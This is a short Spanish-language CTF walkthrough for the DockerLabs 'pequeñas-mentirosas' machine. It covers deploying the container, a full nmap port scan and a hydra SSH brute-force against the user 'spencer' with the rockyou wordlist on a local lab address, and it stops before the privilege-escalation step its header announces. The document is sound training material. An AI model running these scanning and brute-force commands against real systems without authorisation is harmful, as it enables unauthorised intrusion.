Manual de Explotación

Pequeñas Mentirosas

PENTEST · SSH BRUTE FORCE · PRIVILEGE ESCALATION

En DockerLabs, busca pequeñas-mentirosas y descarga el archivo desde el navegador de Kali Linux.

Mueve el archivo desde la carpeta de descargas a documentos, extrae el contenido y abre una terminal dentro de esa carpeta.

Este reto se centra en la explotación de una vulnerabilidad en un servicio web, a través de escalada de privilegios, lo que permite obtener acceso root.

KALI LINUX SSH HTTP HYDRA GOBUSTER NMAP

[01] Fase de Reconocimiento y Enumeración

Primero actualizar Kali Linux y levantar la máquina de pequeñas-mentirosas:

sudo apt update
sudo apt upgrade

Despliegue: Uso del script auto_deploy.sh para levantar el contenedor y obtener la IP (172.17.0.2).

sudo chmod +x auto_deploy.sh
sudo ./auto_deploy.sh pequeñas-mentirosas.tar

Escaneo de Puertos: Identificación de servicios abiertos con nmap.

sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2
PUERTOS DETECTADOS:

22 (SSH) | 80 (HTTP)

[02] Intrusión y Fuerza Bruta

Tras investigar el servicio web, encontramos el usuario spencer. Procedemos con un ataque de fuerza bruta al servicio SSH:

hydra -l spencer -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64
